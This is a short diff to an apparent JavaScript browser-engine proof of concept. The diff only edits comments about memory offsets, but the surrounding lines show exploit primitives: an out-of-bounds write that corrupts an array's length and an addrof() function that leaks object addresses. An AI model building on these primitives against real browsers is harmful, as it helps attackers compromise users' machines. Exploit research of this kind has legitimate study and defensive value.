@@ -71,7 +71,7 @@ function poc() {
         new ArrayBuffer(0xbeef),
     ];
 
-    // 53
+    // => index maybe different...
     const idx = 3;
     //const idx = 6;
     arr[idx + 10] = 0x4242;
@@ -85,6 +85,7 @@ function poc() {
     log("arr length is corrupted => 0x" + cor.length.toString(16));
 
     function addrof(k) {
+	// this "5" offset is also different...
         arr[idx+5] = k;
         return d2u(cor[1]);
     }
